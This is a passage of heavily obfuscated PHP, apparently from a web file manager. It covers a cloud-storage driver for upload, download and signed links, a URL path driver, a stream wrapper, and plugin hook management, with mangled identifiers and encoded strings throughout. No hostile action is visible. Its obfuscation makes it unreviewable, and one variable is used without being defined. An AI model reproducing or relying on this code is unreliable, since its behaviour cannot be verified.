($ãšÔĞÀ¼) { return !0; } } if ($¡Ã˜ËÀÎ < $ÕÄÙ¥ìÏ) { break; } } if ($îş²Ò©Ó) { return array($´ô‚»ú¯[241] => $ì”›Î®, $´ô‚»ú¯[242] => $¨¼¬“Áü); } return !1; } public function listAll($Íı…ËœÜ) { $ç‰Àúàˆ =& $_SERVER[¼’ç§¼´]; $¡ìœ¹Ğ½ = $ò«œµÁ± = array(); $this->fileList($Íı…ËœÜ, $¡ìœ¹Ğ½, $ò«œµÁ±, !0); $Â´Õ·İë = array_to_keyvalue($ò«œµÁ±, $ç‰Àúàˆ[32]); foreach ($¡ìœ¹Ğ½ as $»œ‹ ­’) { if (is_string($»œ‹ ­’)) { $Â´Õ·İë[$»œ‹ ­’] = array($ç‰Àúàˆ[79] => 0); } } return $this->listAllFiles($Íı…ËœÜ, $Â´Õ·İë); } public function canRead($ñ£§ ¯«) { return $this->exist($ñ£§ ¯«) ? !0 : !1; } public function canWrite($—¨Ùàò‚) { return $this->exist($—¨Ùàò‚) ? !0 : !1; } public function getContent($àÌßñàÚ) { return $this->fileSubstr($àÌßñàÚ, 0, -1); } public function setContent($–ÖíğöÄ, $æúÌ†¡ò = '') { $öÃÔ =& $_SERVER[¼’ç§¼´]; if (!$æúÌ†¡ò) { $ë¥Ùˆº = $this->ussRequest($–ÖíğöÄ, $öÃÔ[290]); return $ë¥Ùˆº[$öÃÔ[1306]]; } $šÒ˜€§ = $this->tempFile($this->pathThis($–ÖíğöÄ)); file_put_contents($šÒ˜€§, $æúÌ†¡ò); if ($this->upload($–ÖíğöÄ, $šÒ˜€§)) { $this->tempFileRemve($šÒ˜€§); return !0; } return !1; } public function fileSubstr($¹Ä°ôÜ, $ü±Ì”ª, $½úª…›Ê) { $’ÓïÓ” =& $_SERVER[¼’ç§¼´]; if (!($÷Ø‰ûÙ­ = $this->link($¹Ä°ôÜ))) { return !1; } $›é·Ìı = !1; if ($½úª…›Ê > 0) { $Ğì¿ˆ·Í = $ü±Ì”ª + $½úª…›Ê - 1; $›é·Ìı = array($’ÓïÓ”[1545] . $ü±Ì”ª . $’ÓïÓ”[473] . $Ğì¿ˆ·Í); } $‰Á±š¨ = url_request($÷Ø‰ûÙ­, $’ÓïÓ”[1505], !1, $›é·Ìı); return $‰Á±š¨[$’ÓïÓ”[838]] ? $‰Á±š¨[$’ÓïÓ”[1296]] : !1; } public function upload($È’ØÎñİ, $ƒ¼Õ¤è², $—ÜòìÖÙ = false, $Œ„ñ›Ü¨ = REPEAT_REPLACE) { $¢Í‚¾ûµ =& $_SERVER[¼’ç§¼´]; $Ô¨ŠŸƒŠ = IO::size($ƒ¼Õ¤è²); if ($Ô¨ŠŸƒŠ <= 1024 * 1024 * 200) { $®¨ƒöéë = array($¢Í‚¾ûµ[1587] . $ƒ¼Õ¤è²); $êŸªÃ = $this->ussRequest($È’ØÎñİ, $¢Í‚¾ûµ[255], $®¨ƒöéë); return $êŸªÃ[$¢Í‚¾ûµ[1306]] ? $this->getPathOuter($È’ØÎñİ) : !1; } $Îìš¼Ñ× = 1024 * 1024 * 10; $®£ïÓòÈ = array($¢Í‚¾ûµ[1588], $¢Í‚¾ûµ[1589] . $Ô¨ŠŸƒŠ, $¢Í‚¾ûµ[1590], $¢Í‚¾ûµ[1591] . $Îìš¼Ñ×); $êŸªÃ = $this->ussRequest($È’ØÎñİ, $¢Í‚¾ûµ[255], !1, $®£ïÓòÈ); if (!$êŸªÃ[$¢Í‚¾ûµ[1306]]) { return !1; } $ù²¿¾¥ = $êŸªÃ[$¢Í‚¾ûµ[1296]]; $ÎÄ¸çÄÛ = 0; $ÈëŠ¤ö¶ = $ù²¿¾¥[$¢Í‚¾ûµ[1592]]; $ãËÙâ× = fopen($ƒ¼Õ¤è², $¢Í‚¾ûµ[1468]); if (!$ãËÙâ×) { return !1; } do { $­ª™Ô· = $ù²¿¾¥[$¢Í‚¾ûµ[1593]]; fseek_64($ãËÙâ×, $ÎÄ¸çÄÛ); $ßıËÕ”Å = fread($ãËÙâ×, $­ª™Ô·); $ÉÆğªË = 0; do { $ÉÆğªË++; $ù²¿¾¥ = $this->uploadPart($È’ØÎñİ, $ù²¿¾¥, $ßıËÕ”Å); } while (!$ù²¿¾¥ && $ÉÆğªË < 3); if (!$ù²¿¾¥) { return !1; } $ÈëŠ¤ö¶ = $ù²¿¾¥[$¢Í‚¾ûµ[1592]]; $ÎÄ¸çÄÛ += $­ª™Ô·; } while ($ÈëŠ¤ö¶ != -1); fclose($ãËÙâ×); $®£ïÓòÈ = array($¢Í‚¾ûµ[1594], $¢Í‚¾ûµ[1595] . $ù²¿¾¥[$¢Í‚¾ûµ[1596]], $¢Í‚¾ûµ[1590]); $êŸªÃ = $this->ussRequest($È’ØÎñİ, $¢Í‚¾ûµ[255], !1, $®£ïÓòÈ); return $êŸªÃ[$¢Í‚¾ûµ[1306]] ? $this->getPathOuter($Ç€ˆ›ÔÌ) : !1; } private function uploadPart($ª’à, $ĞÑ“ÕĞ½, &$Úí®—ƒ¢) { $¬Óò¦„Ô =& $_SERVER[¼’ç§¼´]; $Ùµ×Î« = array($¬Óò¦„Ô[1597], $¬Óò¦„Ô[1595] . $ĞÑ“ÕĞ½[$¬Óò¦„Ô[1596]], $¬Óò¦„Ô[1598] . $ĞÑ“ÕĞ½[$¬Óò¦„Ô[1592]], $¬Óò¦„Ô[146] . $ĞÑ“ÕĞ½[$¬Óò¦„Ô[1593]]); $“ãëŸæ£ = $this->ussRequest($ª’à, $¬Óò¦„Ô[255], $Úí®—ƒ¢, $Ùµ×Î«); return !$“ãëŸæ£[$¬Óò¦„Ô[1306]] ? $“ãëŸæ£[$¬Óò¦„Ô[1306]] : $“ãëŸæ£[$¬Óò¦„Ô[1296]]; } public function uploadFormData($ı«ÀÁ¶ò, $©²¬Í“ò = 3600) { return $this->uploadPolicy($ı«ÀÁ¶ò, $©²¬Í“ò); } public function uploadMultiData($³Ÿäğ, $éÛ—æ”ü = 3600) { $ÑÇşÑŞ =& $_SERVER[¼’ç§¼´]; $Ë¿ëæ÷¸ = (int) $GLOBALS[$ÑÇşÑŞ[7]][$ÑÇşÑŞ[79]]; return $this->uploadPolicy($³Ÿäğ, $éÛ—æ”ü, $Ë¿ëæ÷¸); } private function uploadPolicy($åÑÅ¼˜‘, $’üå®ÄÂ = 3600, $úÛÔÈ¨Ç = 0) { $÷ŸšŸãÎ =& $_SERVER[¼’ç§¼´]; $ê¤‰Å»‹ = $÷ŸšŸãÎ[8] . $this->bucket; $ô »ïò´ = gmdate($÷ŸšŸãÎ[1503]); $¶®Æî = array($÷ŸšŸãÎ[1599] => $this->bucket, $÷ŸšŸãÎ[1600] => $åÑÅ¼˜‘, $÷ŸšŸãÎ[1601] => time() + $’üå®ÄÂ, $÷ŸšŸãÎ[1602] => $ô »ïò´); if ($úÛÔÈ¨Ç) { $¶®Æî[$÷ŸšŸãÎ[1488]] = $úÛÔÈ¨Ç; } $“ÎŠú°¤ = base64_encode(json_encode($¶®Æî)); $ççªœü = base64_encode(hash_hmac($÷ŸšŸãÎ[1556], "\120\x4f\x53\x54\x26{$ê¤‰Å»‹}\x26{$ô »ïò´}\46{$“ÎŠú°¤}", md5("{$this->userpass}"), !0)); $±‡ôŠâµ = array($÷ŸšŸãÎ[279] => $“ÎŠú°¤, $÷ŸšŸãÎ[1603] => "\x55\120\131\125\x4e\40{$this->username}\x3a{$ççªœü}", $÷ŸšŸãÎ[208] => $this->endpoint . $ê¤‰Å»‹); return $±‡ôŠâµ; } public function download($õ¸ÉÎäö, $§©ø…íŒ) { $×Ÿš°ú· = IO::getPathInner(IO::mkfile($§©ø…íŒ)); if (!($æÆ§ª×„ = $this->link($õ¸ÉÎäö))) { return !1; } $×ø®·æ£ = 0; $¯íÅ©ŸÏ = 1024 * 200; $Ã°š×øÏ = fopen($×Ÿš°ú·, $_SERVER[¼’ç§¼´][1551]); while (!0) { $¬ÓÆíø™ = $this->fileSubstr($õ¸ÉÎäö, $×ø®·æ£, $¯íÅ©ŸÏ); if ($¬ÓÆíø™ === !1) { return !1; } fwrite($Ã°š×øÏ, $¬ÓÆíø™); $×ø®·æ£ += $¯íÅ©ŸÏ; if (strlen($¬ÓÆíø™) < $¯íÅ©ŸÏ) { break; } } fclose($Ã°š×øÏ); return $§©ø…íŒ; } public function link($ï®ã³ùû, $–»Ïï®œ = array()) { $µÅŒ›´ =& $_SERVER[¼’ç§¼´]; $ï®ã³ùû = trim($ï®ã³ùû, $µÅŒ›´[8]); if (!empty($this->token)) { $ÃÜ€üòƒ = strtotime(date($µÅŒ›´[1604])); $šİ„Âæï = substr(md5($this->token . $µÅŒ›´[286] . $ÃÜ€üòƒ . $µÅŒ›´[1605] . $ï®ã³ùû), 12, 8) . $ÃÜ€üòƒ; $–»Ïï®œ[] = $µÅŒ›´[1606] . $šİ„Âæï; } $Šƒ•ø‘Ç = !empty($–»Ïï®œ) ? $µÅŒ›´[76] . implode($µÅŒ›´[286], $–»Ïï®œ) : $µÅŒ›´[12]; return $this->getHost() . $µÅŒ›´[8] . $this->pathEncode($ï®ã³ùû) . $Šƒ•ø‘Ç; } public function fileOut($ïœŞ‡Éš, $Ñêå‘•Ô = false, $û†ÔŒÎ = false, $ŸÂØ¢É• = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ïœŞ‡Éš, $Ñêå‘•Ô, $û†ÔŒÎ, $ŸÂØ¢É•); } if (!$û†ÔŒÎ) { $û†ÔŒÎ = $this->pathThis($ïœŞ‡Éš); } $¢÷åûŒ½ = $Ñêå‘•Ô ? array($_SERVER[¼’ç§¼´][1607] . rawurlencode($û†ÔŒÎ)) : array(); $€Ûü‹œ = $this->link($ïœŞ‡Éš, $¢÷åûŒ½); $this->fileOutLink($€Ûü‹œ); } public function fileOutServer($ıÆıñà½, $À€Ôù = false, $›¥Áß÷ø = false, $šâ…á¥ = '') { parent::fileOut($ıÆıñà½, $À€Ôù, $›¥Áß÷ø, $šâ…á¥); } public function fileOutImage($­• ıÛ½, $¬óÛïí = 250) { $–‰ªŞ = $this->link($­• ıÛ½ . $_SERVER[¼’ç§¼´][1608] . $¬óÛïí); $this->fileOutLink($–‰ªŞ); } public function fileOutImageServer($¤™¥¾¯˜, $û°¡ŞÓ = 250) { parent::fileOutImage($¤™¥¾¯˜, $û°¡ŞÓ); } public function hashMd5($ëÖòå‡ş) { $î”±ƒÉ =& $_SERVER[¼’ç§¼´]; $·İ¥è«¦ = $this->_objectMeta($ëÖòå‡ş); return isset($·İ¥è«¦[$î”±ƒÉ[247]]) ? $·İ¥è«¦[$î”±ƒÉ[247]] : !1; } public function size($¸şü¤ºù) { $•»º†˜­ = $this->objectMeta($¸şü¤ºù); return $•»º†˜­ ? $•»º†˜­[$_SERVER[¼’ç§¼´][79]] : 0; } public function info($¡¸ËêÏ›) { if ($this->isFolder($¡¸ËêÏ›)) { return $this->folderInfo($¡¸ËêÏ›); } else { if ($this->isFile($¡¸ËêÏ›)) { return $this->fileInfo($¡¸ËêÏ›); } } return !1; } public function exist($œä•àÙ²) { return $this->isFile($œä•àÙ²) || $this->isFolder($œä•àÙ²); } public function isFile($ä×Ëüî…) { return !$this->isFolder($ä×Ëüî…) && $this->objectMeta($ä×Ëüî…); } public function isFolder($ÓÎØñ‹) { return $this->cacheMethod($_SERVER[¼’ç§¼´][179], $ÓÎØñ‹); } protected function objectMeta($õ´¸Ëü) { return $this->cacheMethod($_SERVER[¼’ç§¼´][181], $õ´¸Ëü); } protected function _objectMeta($¬§í¢®ô) { $Â¯š¬€Ú =& $_SERVER[¼’ç§¼´]; if ($¬§í¢®ô == $Â¯š¬€Ú[12] || $¬§í¢®ô == $Â¯š¬€Ú[8]) { return array(); } $È–›ş‡· = $this->ussRequest($¬§í¢®ô, $Â¯š¬€Ú[1609]); if (!$È–›ş‡·[$Â¯š¬€Ú[1306]]) { return null; } $Í—´é¸ = isset($È–›ş‡·[$Â¯š¬€Ú[1296]]) ? $È–›ş‡·[$Â¯š¬€Ú[1296]] : array(); if (!isset($Í—´é¸[$Â¯š¬€Ú[1610]])) { return null; } $æÇèø¦¢ = array($Â¯š¬€Ú[33] => isset($Í—´é¸[$Â¯š¬€Ú[1610]]) ? $Í—´é¸[$Â¯š¬€Ú[1610]] : null, $Â¯š¬€Ú[79] => isset($Í—´é¸[$Â¯š¬€Ú[1611]]) ? $Í—´é¸[$Â¯š¬€Ú[1611]] : null, $Â¯š¬€Ú[247] => isset($Í—´é¸[$Â¯š¬€Ú[1612]]) ? $Í—´é¸[$Â¯š¬€Ú[1612]] : null, $Â¯š¬€Ú[1579] => isset($Í—´é¸[$Â¯š¬€Ú[1613]]) ? $Í—´é¸[$Â¯š¬€Ú[1613]] : null); $æÇèø¦¢[$Â¯š¬€Ú[1580]] = isset($Í—´é¸[$Â¯š¬€Ú[1614]]) ? strtotime($Í—´é¸[$Â¯š¬€Ú[1614]]) : $æÇèø¦¢[$Â¯š¬€Ú[1579]]; return $æÇèø¦¢; } protected function _isFolder($±™÷§¨ï) { $Ì²öÙæ® =& $_SERVER[¼’ç§¼´]; if ($±™÷§¨ï == $Ì²öÙæ®[12] || $±™÷§¨ï == $Ì²öÙæ®[8]) { return !0; } $â…¯¤¯Œ = $this->_objectMeta($±™÷§¨ï); return isset($â…¯¤¯Œ[$Ì²öÙæ®[33]]) && $â…¯¤¯Œ[$Ì²öÙæ®[33]] == $Ì²öÙæ®[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ì±ÏÔà = false) { } public function exist($í¹’Ş‹ì) { $¾¹åğÕÃ = $this->info($í¹’Ş‹ì); return $¾¹åğÕÃ[$_SERVER[¼’ç§¼´][234]]; } public function isFile($¸Ëî›¾¢) { $ğ§÷µ = $this->info($¸Ëî›¾¢); return $ğ§÷µ[$_SERVER[¼’ç§¼´][234]]; } public function isFolder($ÇÇ£Ü³) { return !1; } public function size($—ù’¿¥) { $Õ¿ÛšÔ = $this->info($—ù’¿¥); return $Õ¿ÛšÔ[$_SERVER[¼’ç§¼´][79]]; } public function info($Ú™°¦ÄË) { return $this->infoParse($Ú™°¦ÄË); } public function infoAuth($Í¢÷¼¢Ì) { return $this->infoParse($Í¢÷¼¢Ì); } public function infoWithChildren($ÍÙİÛä) { return $this->infoParse($ÍÙİÛä); } public function infoFull($ÃÜ³İ•Ì) { return $this->infoParse($ÃÜ³İ•Ì); } private function infoParse($Ğû¸‹Ó) { $Îú¸ñéš =& $_SERVER[¼’ç§¼´]; $·£ıè½Ÿ = $this->header($Ğû¸‹Ó); if (!$·£ıè½Ÿ || !$·£ıè½Ÿ[$Îú¸ñéš[838]]) { return !1; } $Áøã»æ« = _get($·£ıè½Ÿ, $Îú¸ñéš[414], 0); $ø×£Šİ’ = array($Îú¸ñéš[32] => $·£ıè½Ÿ[$Îú¸ñéš[32]], $Îú¸ñéš[87] => $Ğû¸‹Ó, $Îú¸ñéš[33] => $Îú¸ñéš[232], $Îú¸ñéš[79] => intval($Áøã»æ«), $Îú¸ñéš[169] => get_path_ext($·£ıè½Ÿ[$Îú¸ñéš[32]]), $Îú¸ñéš[1465] => $Áøã»æ« > 0 && $·£ıè½Ÿ[$Îú¸ñéš[1615]], $Îú¸ñéš[1466] => !1); return $ø×£Šİ’; } private function header($åíéÓñˆ) { $ï—œ©üÏ =& $_SERVER[¼’ç§¼´]; if (isset(self::$_cacheHeader[$åíéÓñˆ])) { return self::$_cacheHeader[$åíéÓñˆ]; } $¯±Ââ¿Ø = isset($GLOBALS[$ï—œ©üÏ[1616]]) ? $GLOBALS[$ï—œ©üÏ[1616]] : !1; $GLOBALS[$ï—œ©üÏ[1616]] = !0; self::$_cacheHeader[$åíéÓñˆ] = url_header($åíéÓñˆ); $GLOBALS[$ï—œ©üÏ[1616]] = $¯±Ââ¿Ø; return self::$_cacheHeader[$åíéÓñˆ]; } public function hashSimple($öåöÛ˜ı, $¾™Ç´‘Å = false) { $€ˆı Õ« =& $_SERVER[¼’ç§¼´]; $ Ç€ê¡İ = $this->info($öåöÛ˜ı); if (!$ Ç€ê¡İ || !$ Ç€ê¡İ[$€ˆı Õ«[234]]) { return !1; } $»®ŠÑß = $ Ç€ê¡İ[$€ˆı Õ«[79]]; $›Òøèô³ = 200; $¥å…“ˆ = 50; if ($»®ŠÑß <= $›Òøèô³ * $¥å…“ˆ) { return md5($this->fileSubstr($öåöÛ˜ı, 0, $»®ŠÑß)) . $»®ŠÑß; } $êïçø§ = intval($»®ŠÑß / $¥å…“ˆ); $çïèî„Õ = $€ˆı Õ«[12]; $Ñ½ã©§Ò = timeFloat(); $“›ØÃÀ¼ = 15; for ($¢ªšôÇ± = 0; $¢ªšôÇ± < $¥å…“ˆ; $¢ªšôÇ±++) { if (timeFloat() - $Ñ½ã©§Ò > $“›ØÃÀ¼) { return !1; } $ßêÔ²¡– = $this->fileSubstr($öåöÛ˜ı, $êïçø§ * $¢ªšôÇ±, $›Òøèô³); if (!$ßêÔ²¡–) { return !1; } $çïèî„Õ .= $ßêÔ²¡–; } $çïèî„Õ .= $this->fileSubstr($öåöÛ˜ı, $»®ŠÑß - $›Òøèô³, $›Òøèô³); return md5($çïèî„Õ) . $»®ŠÑß; } public function getContent($™©¼Ê¼ü) { return $this->fileSubstr($™©¼Ê¼ü); } public function fileSubstr($ÄæÊæí©, $çˆ‘Ú†» = 0, $ïÄËîöÏ = -1) { $¸€µì±” =& $_SERVER[¼’ç§¼´]; $‡à…‚øî = $this->info($ÄæÊæí©); if (!$‡à…‚øî || !$‡à…‚øî[$¸€µì±”[234]] && $‡à…‚øî[$¸€µì±”[79]] > 1024 * 1024 * 10) { return !1; } if ($ïÄËîöÏ === -1) { $ïÄËîöÏ = $‡à…‚øî[$¸€µì±”[79]]; } if ($ïÄËîöÏ == 0) { return $¸€µì±”[12]; } $÷ÉìÜ§£ = array($¸€µì±”[1617] . $çˆ‘Ú†» . $¸€µì±”[874] . ($çˆ‘Ú†» + $ïÄËîöÏ - 1)); $Æ˜µ ´— = url_request($ÄæÊæí©, $¸€µì±”[1505], !1, $÷ÉìÜ§£, !1, !1, 30); return $Æ˜µ ´—[$¸€µì±”[1296]] ? $Æ˜µ ´—[$¸€µì±”[1296]] : $¸€µì±”[12]; } public function download($åºÔıïİ, $ÌĞÏ’Öş) { Downloader::start($åºÔıïİ, $ÌĞÏ’Öş); return $ÌĞÏ’Öş; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($í±Ò ¿, $ŸÌË¶‹Õ = '') { $this->info = $this->info($í±Ò ¿); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¼’ç§¼´][87]]; $this->pathOpen = $í±Ò ¿; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$í±Ò ¿])) { self::$_chunkBuffer[$í±Ò ¿] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($şÁİè¬) { $¿·åÈÉ = $this->fileSubstr($this->pose, $şÁİè¬); $this->pose += strlen($¿·åÈÉ); return $¿·åÈÉ; } public function stream_tell() { return $this->pose; } public function stream_seek($·û¤ÀÎµ, $œä±†Ã) { $Ìä°ıˆ‡ =& $_SERVER[¼’ç§¼´]; if ($œä±†Ã == SEEK_SET) { $this->pose = $·û¤ÀÎµ; } else { if ($œä±†Ã == SEEK_CUR) { $this->pose += $·û¤ÀÎµ; } else { if ($œä±†Ã == SEEK_END) { $this->pose = $this->info[$Ìä°ıˆ‡[79]] + intval($·û¤ÀÎµ); } } } if ($·û¤ÀÎµ < 0) { $this->pose = $this->info[$Ìä°ıˆ‡[79]] + $·û¤ÀÎµ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¼’ç§¼´][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÌÊó¶Û, $Î·Ğ§™¦) { $ÜÌñÍ·« =& $_SERVER[¼’ç§¼´]; $ŠÛÇˆ‘Æ = $this->info($ÌÊó¶Û); return array($ÜÌñÍ·«[1409] => 0, $ÜÌñÍ·«[1618] => 0, $ÜÌñÍ·«[16] => 32768 + 511, $ÜÌñÍ·«[1619] => 0, $ÜÌñÍ·«[1620] => 0, $ÜÌñÍ·«[1621] => 0, $ÜÌñÍ·«[1622] => 0, $ÜÌñÍ·«[79] => $ŠÛÇˆ‘Æ[$ÜÌñÍ·«[79]], $ÜÌñÍ·«[1623] => $ŠÛÇˆ‘Æ[$ÜÌñÍ·«[1464]], $ÜÌñÍ·«[1580] => $ŠÛÇˆ‘Æ[$ÜÌñÍ·«[88]], $ÜÌñÍ·«[1579] => $ŠÛÇˆ‘Æ[$ÜÌñÍ·«[233]], $ÜÌñÍ·«[1624] => 0, $ÜÌñÍ·«[1625] => 0); } static $fileInfo = array(); public function info($—î¡á®Á) { $Œ´¿É­ = $_SERVER[¼’ç§¼´][1626]; if (isset(self::$fileInfo[$—î¡á®Á])) { return self::$fileInfo[$—î¡á®Á]; } if (substr($—î¡á®Á, 0, strlen($Œ´¿É­)) != $Œ´¿É­) { return !1; } self::$fileInfo[$—î¡á®Á] = IO::info(substr($—î¡á®Á, strlen($Œ´¿É­))); return self::$fileInfo[$—î¡á®Á]; } public static function read($à’…şÎ, $ñÅ†­€³, $”†ë”à) { if (!isset(self::$_fopenCache[$à’…şÎ])) { $ùáİ « = new StreamWrapperIO(); $ùáİ «->stream_open($à’…şÎ); self::$_fopenCache[$à’…şÎ] = $ùáİ «; } $ùáİ « = self::$_fopenCache[$à’…şÎ]; return $ùáİ «->fileSubstr($ñÅ†­€³, $”†ë”à); } public static function _read($¯†ºßå, $ÆÅæ´Ä¾, $²íÆıŒø) { $”´¾¥ñÍ =& $_SERVER[¼’ç§¼´]; $»Ï«³Ù = fopen($¯†ºßå, $”´¾¥ñÍ[1468]); if (!$»Ï«³Ù) { return $”´¾¥ñÍ[12]; } $½ºèÔ““ = 8192; fseek($»Ï«³Ù, $ÆÅæ´Ä¾, SEEK_SET); $Ó¢·‚Î‡ = $”´¾¥ñÍ[12]; $§„øùÔö = 0; while ($§„øùÔö < $²íÆıŒø) { $ÌÖ­àÍ‡ = min($½ºèÔ““, $²íÆıŒø - $§„øùÔö); $Ó¢·‚Î‡ .= fread($»Ï«³Ù, $ÌÖ­àÍ‡); $§„øùÔö += $ÌÖ­àÍ‡; } fclose($»Ï«³Ù); return $Ó¢·‚Î‡; } public function fileSubstr($ŠŸ“•À, $¦Šøôşë) { $üÜ±ªÓ =& $_SERVER[¼’ç§¼´]; $Û‘‹½ = $this->info[$üÜ±ªÓ[79]]; $·™¨¶± = $ŠŸ“•À; $ú®´†‚ = $¦Šøôşë; if ($ŠŸ“•À < 0) { $ŠŸ“•À = $Û‘‹½ + $ŠŸ“•À; } if ($¦Šøôşë === !1) { $¦Šøôşë = $Û‘‹½ - $ŠŸ“•À; } if ($ŠŸ“•À + $¦Šøôşë > $Û‘‹½) { $¦Šøôşë = $Û‘‹½ - $ŠŸ“•À; } if ($¦Šøôşë <= 0) { return $üÜ±ªÓ[12]; } if ($ŠŸ“•À < 0 || $ŠŸ“•À >= $Û‘‹½ || $¦Šøôşë <= 0 || $¦Šøôşë > 1024 * 1024 * 10) { throw new Exception("\151\x6f\106\151\154\145\122\x65\141\x64\40\x65\x72\162\x6f\162\x21\40\x73\x74\x61\162\x74\x3d{$ŠŸ“•À}\x3b\154\x65\x6e\147\164\150\75{$¦Šøôşë}\73\40\x73\151\172\145\75{$Û‘‹½}\x3b"); } $ÏèÚğ×· = 64 * 1024; $èĞ×ı÷Â =& self::$_chunkBuffer[$this->path]; if (!$èĞ×ı÷Â) { $èĞ×ı÷Â = array(); } $şØèÌ¬À = 0; $›ìÒ£ò½ = 0; $¼ÒÆÂó” = $üÜ±ªÓ[12]; foreach ($èĞ×ı÷Â as $şØèÌ¬À => $¼ÒÆÂó”) { $şØèÌ¬À = intval($şØèÌ¬À); $›ìÒ£ò½ = $şØèÌ¬À + strlen($¼ÒÆÂó”); if ($ŠŸ“•À >= $›ìÒ£ò½) { continue; } if ($ŠŸ“•À >= $şØèÌ¬À && $ŠŸ“•À + $¦Šøôşë <= $›ìÒ£ò½) { return substr($¼ÒÆÂó”, $ŠŸ“•À - $şØèÌ¬À, $¦Šøôşë); } break; } if (count($èĞ×ı÷Â) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($üÜ±ªÓ[1627], $üÜ±ªÓ[1628] . count($èĞ×ı÷Â) . "\73\163\x74\x61\x72\x74\x3d{$ŠŸ“•À}\54\154\145\x6e\x67\x74\x68\75{$¦Šøôşë}\73\160\157\163\x65\x3a{$şØèÌ¬À}\x7e{$›ìÒ£ò½}"); throw new Exception($üÜ±ªÓ[1629]); } $­˜³õè… = intval($ŠŸ“•À / $ÏèÚğ×·) * $ÏèÚğ×·; $Ä–¡³ñó = ceil(($ŠŸ“•À + $¦Šøôşë) / $ÏèÚğ×·) * $ÏèÚğ×· - $­˜³õè…; $ûùŸØù¢ = IO::fileSubstr($this->path, $­˜³õè…, $Ä–¡³ñó); $èĞ×ı÷Â[$­˜³õè… . $üÜ±ªÓ[12]] = $ûùŸØù¢; ksort($èĞ×ı÷Â); $ˆğ‘Äú· = substr($ûùŸØù¢, $ŠŸ“•À - $­˜³õè…, $¦Šøôşë); return $ˆğ‘Äú·; } private function log($¿Ã‰²²ˆ, $ƒéÂˆõ¸) { $˜¬šÑİ÷ =& $_SERVER[¼’ç§¼´]; $Ñ³Â›ï± = timeFloat() - $this->timeStart; write_log(sprintf($˜¬šÑİ÷[1630], $¿Ã‰²²ˆ, $this->info[$˜¬šÑİ÷[32]], $Ñ³Â›ï±, $ƒéÂˆõ¸), $˜¬šÑİ÷[1273]); } } goto FÖ×Ÿóå; A“ˆ¿ë¦„: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\160\x6c\x75\147\151\x6e\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\145", "\163\x74\x61\x74\x75\x73", "\162\x65\147\151\x65\x73\164", "\143\x6f\x6e\146\151\147"); public function loadList($àÎï‘¾ = false) { $á¥À´Œ = array_to_keyvalue($this->listData(), $_SERVER[¼’ç§¼´][32]); if ($àÎï‘¾) { return $á¥À´Œ[$àÎï‘¾]; } return $á¥À´Œ; } public function init() { $´Ó™É—ˆ =& $_SERVER[¼’ç§¼´]; Hook::trigger($´Ó™É—ˆ[2108]); $Ü®¸ğûı = $this->loadPluginList(); foreach ($Ü®¸ğûı as $Äí–ßì® => $ûîÓŞŠ¦) { $Á’÷ÛÊ = $this->appAllow($Äí–ßì®, $ûîÓŞŠ¦); if (!$Á’÷ÛÊ) { continue; } foreach ($ûîÓŞŠ¦[$´Ó™É—ˆ[2109]] as $è‚äáŞŠ => $† ÎÙ¹) { Hook::bind($è‚äáŞŠ, $† ÎÙ¹); } } Hook::trigger($´Ó™É—ˆ[2110]); Hook::trigger(ACTION); } public function appAllow($ğ’¤­¬, $Å…÷¹¬, $µçë¹ÜÔ = true) { $ñ®ô‚ªó =& $_SERVER[¼’ç§¼´]; $·İœå€Â = PLUGIN_DIR . $ğ’¤­¬ . $ñ®ô‚ªó[2111]; if (!is_array($Å…÷¹¬) || !is_array($Å…÷¹¬[$ñ®ô‚ªó[2109]]) || $Å…÷¹¬[$ñ®ô‚ªó[838]] != 1 || !is_file($·İœå€Â)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ñ®ô‚ªó[6]][$ñ®ô‚ªó[2112]] || !$GLOBALS[$ñ®ô‚ªó[6]][$ñ®ô‚ªó[2113]]) { return !0; } $Êì…ÂÛ = explode($ñ®ô‚ªó[50], strtolower($GLOBALS[$ñ®ô‚ªó[6]][$ñ®ô‚ªó[2113]])); return in_array(strtolower($ğ’¤­¬), $Êì…ÂÛ) ? !1 : !0; } if ($µçë¹ÜÔ && !Action($ñ®ô‚ªó[2114])->checkAuth($ğ’¤­¬)) { return !1; } return !0; } public function unInstall($¶ÃóšÁ») { $ñÉ¬­‘º =& $_SERVER[¼’ç§¼´]; $Ô„±äúü = $this->loadList($¶ÃóšÁ»); if (file_exists(PLUGIN_DIR . $¶ÃóšÁ»)) { Hook::apply($¶ÃóšÁ» . $ñÉ¬­‘º[2115]); } $this->remove($Ô„±äúü[$ñÉ¬­‘º[486]]); } public function changeStatus($ÔÀÛŠ¥è, $ñ§×ÛŸ³) { $–’Õˆù˜ =& $_SERVER[¼’ç§¼´]; $Õ½¬ì®» = $this->loadList($ÔÀÛŠ¥è); if ($ñ§×ÛŸ³) { Hook::apply($ÔÀÛŠ¥è . $–’Õˆù˜[2116]); } $this->update($Õ½¬ì®»[$–’Õˆù˜[486]], array($–’Õˆù˜[2117] => $ñ§×ÛŸ³)); } public function appRegist($éûßƒ†Œ, $º­±»º) { $Ù¿›Ø¥ =& $_SERVER[¼’ç§¼´]; $šĞÕœ¤‰ = $this->loadList($éûßƒ†Œ); if ($šĞÕœ¤‰) { $this->update($šĞÕœ¤‰[$Ù¿›Ø¥[486]], array($Ù¿›Ø¥[2109] => $º­±»º)); } else { $Â´“ú§³ = array($Ù¿›Ø¥[32] => $éûßƒ†Œ, $Ù¿›Ø¥[2109] => $º­±»º, $Ù¿›Ø¥[838] => 0, $Ù¿›Ø¥[6] => $this->getConfigDefault($éûßƒ†Œ)); $this->insert($Â´“ú§³); } } public function getConfigDefault($‘æÔ”ùè) { $Ü•öÛƒÊ =& $_SERVER[¼’ç§¼´]; $’Ø×ôÜÜ = 